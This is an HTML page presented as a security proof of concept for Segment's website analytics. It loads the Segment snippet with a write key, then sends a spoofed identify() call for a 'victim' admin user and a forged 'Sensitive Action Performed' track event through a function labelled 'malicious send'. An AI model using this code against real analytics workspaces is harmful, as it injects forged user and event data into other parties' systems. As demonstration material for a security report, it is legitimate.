<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Segment Website JS – Security PoC</title>

  <style>
    body {
      font-family: system-ui, sans-serif;
      background: #020617;
      color: #e5e7eb;
      padding: 40px;
      display: flex;
      justify-content: center;
    }

    .container {
      width: 900px;
      background: #020617;
      border: 1px solid #1e293b;
      border-radius: 14px;
      padding: 28px;
      box-shadow: 0 30px 60px rgba(0,0,0,.6);
    }

    h1 {
      margin-top: 0;
      font-size: 26px;
    }

    .sub {
      color: #94a3b8;
      margin-bottom: 20px;
    }

    button {
      background: #22c55e;
      border: none;
      color: #022c22;
      padding: 12px 18px;
      border-radius: 10px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      margin-right: 10px;
    }

    button.danger {
      background: #ef4444;
      color: #fff;
    }

    button.alt {
      background: #3b82f6;
      color: #fff;
    }

    textarea {
      width: 100%;
      height: 160px;
      background: #020617;
      border: 1px solid #1e293b;
      border-radius: 10px;
      padding: 14px;
      color: #e5e7eb;
      font-family: ui-monospace, monospace;
      font-size: 13px;
      margin-top: 12px;
    }

    .panel {
      margin-top: 26px;
    }

    .label {
      color: #38bdf8;
      font-weight: 600;
      margin-bottom: 6px;
    }

    pre {
      background: #020617;
      border: 1px solid #1e293b;
      border-radius: 10px;
      padding: 14px;
      font-size: 13px;
      overflow-x: auto;
    }

    .badge {
      display: inline-block;
      background: #1e293b;
      padding: 4px 8px;
      border-radius: 6px;
      font-size: 12px;
      margin-right: 6px;
    }
  </style>

  <!-- Segment official snippet -->
  <script>
    !function(){var i="analytics",analytics=window[i]=window[i]||[];
    if(!analytics.initialize)
    if(analytics.invoked)window.console&&console.error&&console.error("Segment snippet included twice.");
    else{
      analytics.invoked=!0;
      analytics.methods=["track","identify","page","ready","user"];
      analytics.factory=function(e){return function(){
        var n=Array.prototype.slice.call(arguments);
        n.unshift(e);analytics.push(n);return analytics
      }};
      for(var n=0;n<analytics.methods.length;n++){
        var key=analytics.methods[n];
        analytics[key]=analytics.factory(key)
      }
      analytics.load=function(key){
        var t=document.createElement("script");
        t.async=!0;
        t.src="https://cdn.segment.com/analytics.js/v1/" + key + "/analytics.min.js";
        var r=document.getElementsByTagName("script")[0];
        r.parentNode.insertBefore(t,r)
      };
      analytics.load("xEiDiPEAJsNfEJeWw4ggJhfUZ30gdqii");
      analytics.page();
    }}();
  </script>
</head>

<body>
  <div class="container">
    <h1>Segment Website JS – Security PoC UI</h1>
    <div class="sub">
      Client-side payload visibility · identify() transition · event spoofing
    </div>

    <button class="alt" onclick="doIdentify()">Identify User</button>
    <button onclick="prepareTrack()">Prepare Track Event</button>
    <button class="danger" onclick="sendTrack()">Send Track Event</button>

    <div class="panel">
      <div class="label">Prepared Event Payload (BEFORE SEND)</div>
      <textarea id="payload"></textarea>
    </div>

    <div class="panel">
      <div class="label">Live State</div>
      <pre id="state"></pre>
    </div>
  </div>

  <script>
    let anonId = "loading";
    let userId = null;
    let preparedPayload = null;

    analytics.ready(function () {
      anonId = analytics.user().anonymousId();
      updateState();
    });

    function updateState() {
      document.getElementById("state").textContent = JSON.stringify({
        anonymousId: anonId,
        userId: userId,
        timestamp: new Date().toISOString()
      }, null, 2);
    }

    /* -------- identify() transition -------- */
    function doIdentify() {
      userId = "victim-user-1337";

      analytics.identify(userId, {
        email: "victim@example.com",
        role: "admin",
        plan: "enterprise"
      });

      updateState();
      alert("identify() sent — user is now known");
    }

    /* -------- prepare (but do NOT send) -------- */
    function prepareTrack() {
      preparedPayload = {
        event: "Sensitive Action Performed",
        properties: {
          amount: 999999,
          currency: "USD",
          isAdmin: true,
          injected: true,
          debug_note: "client-side controlled payload"
        },
        context: {
          page: {
            path: location.pathname,
            url: location.href
          }
        },
        anonymousId: anonId,
        userId: userId,
        timestamp: new Date().toISOString()
      };

      document.getElementById("payload").value =
        JSON.stringify(preparedPayload, null, 2);
    }

    /* -------- malicious send -------- */
    function sendTrack() {
      if (!preparedPayload) {
        alert("Prepare payload first");
        return;
      }

      analytics.track(
        preparedPayload.event,
        preparedPayload.properties
      );

      alert("Track event sent to Segment");
    }
  </script>
</body>
</html>
